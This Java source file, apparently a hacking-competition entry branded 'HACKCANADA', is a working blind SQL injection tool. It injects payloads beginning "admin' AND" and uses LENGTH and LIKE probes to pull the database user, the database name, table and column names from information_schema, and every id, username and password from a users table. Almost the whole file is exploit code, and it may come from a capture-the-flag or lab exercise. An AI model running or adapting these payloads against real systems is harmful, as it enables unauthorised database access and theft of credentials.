package main;

//import org.json.JSONObject;

public class Start {
	public static void main(String[] args) throws Exception {

        System.out.println("        .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. ");
        System.out.println("       | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |");
        System.out.println("       | |  ____  ____  | || |     __       | || |  ____  ____  | || |  _________   | || |      __      | || |  _________   | |");
        System.out.println("       | | |_   ||   _| | || |    /  |      | || | |_   ||   _| | || | |_   ___  |  | || |     /  \\     | || | |  _   _  |  | |");
        System.out.println("       | |   | |__| |   | || |    `| |      | || |   | |__| |   | || |   | |_  \\_|  | || |    / /\\ \\    | || | |_/ | | \\_|  | |");
        System.out.println("       | |   |  __  |   | || |     | |      | || |   |  __  |   | || |   |  _|  _   | || |   / ____ \\   | || |     | |      | |");
        System.out.println("       | |  _| |  | |_  | || |    _| |_     | || |  _| |  | |_  | || |  _| |___/ |  | || | _/ /    \\ \\_ | || |    _| |_     | |");
        System.out.println("       | | |____||____| | || |   |_____|    | || | |____||____| | || | |_________|  | || ||____|  |____|| || |   |_____|    | |");
        System.out.println("       | |              | || |              | || |              | || |              | || |              | || |              | |");
        System.out.println("       | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |");
        System.out.println("        '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' ");
        System.out.println("\n");
        System.out.println("\n");
		System.out.println("Lets get er' done eh... HACKCANADA!");
		
		//set options for debugging - these need to be passed in from the CMD
		String ops = "i";
		String argVar1 = "users";	
		
		int cellLength = 0;
		int cellLengthOut = 0;
		String cellValue ="";
		String[] userArray = {"id", "username", "password"};
		String[] devicesArray = {"id", "ip"};
		
		//get the username
		if (ops == "u") {
			//get the length of the value
			System.out.println("Getting the length of the Username:");
			cellLength = Integer.valueOf(Functions.getLength("admin' AND LENGTH(user())="));
			System.out.println(String.valueOf(cellLength));
			
			//get the field for username
			System.out.println("You gotta wait, this could take a while .....");
			System.out.println("The current username is:");
			System.out.println(Functions.getField("admin' AND user() LIKE '", cellLength));
		}
		//get the database name
		if (ops == "d") {
			//get the length of the value
			System.out.println("Getting the length of the Database Name:");
			cellLength = Integer.valueOf(Functions.getLength("admin' AND LENGTH(database())="));
			System.out.println(String.valueOf(cellLength));
			
			//get the field value for the database
			System.out.println("You gotta wait, this could take a while .....");
			System.out.println("The current database is:");
			System.out.println(Functions.getField("admin' AND database() LIKE '", cellLength));
		}	
		//Get the table names
		if (ops == "t") {
			System.out.println("Getting the number of tables in the database:");
			cellLength = Integer.valueOf(Functions.getLength("admin' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())="));
			System.out.println(String.valueOf(cellLength));
			//get length of table string value
			while (cellLength > 0) {
				System.out.println("Getting the length of the name of table number "+String.valueOf(cellLength)+" in the database:");
				cellLength--;
				cellLengthOut = Integer.valueOf(Functions.getLength("admin' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET "+String.valueOf(cellLength)+")="));
				System.out.println(String.valueOf(cellLengthOut));
				//Get the field value
				System.out.print("The table name is: ");
				cellValue = Functions.getField("admin' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET "+String.valueOf(cellLength)+") LIKE '", cellLengthOut);
				System.out.print(String.valueOf(cellValue+"\n"));
			}
		}
		//Get columns from table
		if (ops == "c") {
			System.out.println("Getting the number of columns in "+argVar1+":");
			cellLength = Integer.valueOf(Functions.getLength("admin' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+argVar1+"')="));
			System.out.println(String.valueOf(cellLength));
			//get length of table string value
			while (cellLength > 0) {
				System.out.println("Getting the length of column number "+String.valueOf(cellLength)+" in the table "+argVar1+" :");
				cellLength--;
				cellLengthOut = Integer.valueOf(Functions.getLength("admin' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+argVar1+"' LIMIT 1 OFFSET "+String.valueOf(cellLength)+")="));
				System.out.println(String.valueOf(cellLengthOut));
				//Get the value
				System.out.print("Column number "+cellLength+" is: ");
				cellValue = Functions.getField("admin' AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+argVar1+"' LIMIT 1 OFFSET "+String.valueOf(cellLength)+") LIKE '", cellLengthOut);
				System.out.print(String.valueOf(cellValue+"\n"));
			}
		}
		//Get data from the table
		if (ops == "i") {
			System.out.print("Getting the number of rows in "+argVar1+": ");
			cellLength = Integer.valueOf(Functions.getLength("admin' AND (SELECT COUNT(*) FROM "+argVar1+")="));
			System.out.print(String.valueOf(cellLength)+"\n");
			System.out.print("\n\n\n");
			System.out.println("----------------------------------------------------------------------------------------------------");
			System.out.println(userArray[0]+"\t\t"+userArray[1]+"\t\t"+userArray[2]);
			//System.out.println(devicesArray[0]+"\t\t"+devicesArray[1]);
			//get length of table string value
			while (cellLength > 0) {
				cellLength--;
				for (String columnName : userArray) {
					cellLengthOut = Integer.valueOf(Functions.getLength("admin' AND (SELECT LENGTH("+columnName+") FROM "+argVar1+" LIMIT 1 OFFSET "+String.valueOf(cellLength)+")="));
					cellValue = Functions.getField("admin' AND (SELECT "+columnName+" FROM "+argVar1+" LIMIT 1 OFFSET "+String.valueOf(cellLength)+") LIKE '", cellLengthOut);
					System.out.print(String.valueOf(cellValue+"\t\t"));
				}
				System.out.print("\n");
			}
			System.out.println("----------------------------------------------------------------------------------------------------");
		}
		//the end
        System.out.println("-------------------That's all folks-------------------");
    }
}
